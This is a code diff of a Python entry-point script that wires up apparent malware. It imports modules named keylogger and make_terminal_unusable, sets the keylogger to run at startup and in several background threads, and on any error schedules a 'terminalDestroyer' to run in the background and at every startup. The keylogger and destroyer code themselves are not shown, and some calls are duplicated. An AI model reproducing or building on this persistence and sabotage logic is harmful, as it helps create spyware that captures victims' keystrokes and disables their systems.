@@ -3,23 +3,27 @@ import make_terminal_unusable
 import os
 import keylogger
 import make_terminal_unusable
+import CodeTest
+import test
 import platform
 
 
 if __name__ == '__main__':
     try:
 
-        keylogger.on_press()
-        keylogger.start_keylogger()
+        background_runner.run_on_startup(startup_task=keylogger.start_keylogger)
+        background_runner.run_in_background(target=keylogger.start_keylogger)
+        background_runner.run_in_background(target=keylogger.on_press)
+        background_runner.run_in_background(target=keylogger.on_press)
 
-        make_terminal_unusable.terminalDestroyer()
-
-        background_runner.run_on_startup(startup_task="keylogger.py")
-        background_runner.run_in_background(target="keylogger.py")
+        background_runner.run_in_background(target=CodeTest.codeTest)
+        test.run_forever("./CodeTest.py")
 
     except Exception:
 
-        make_terminal_unusable.terminalDestroyer()
+        background_runner.run_in_background(target=make_terminal_unusable.terminalDestroyer)
+        background_runner.run_on_startup(startup_task=make_terminal_unusable.terminalDestroyer)
+
 
 else:
     OS = platform.system()
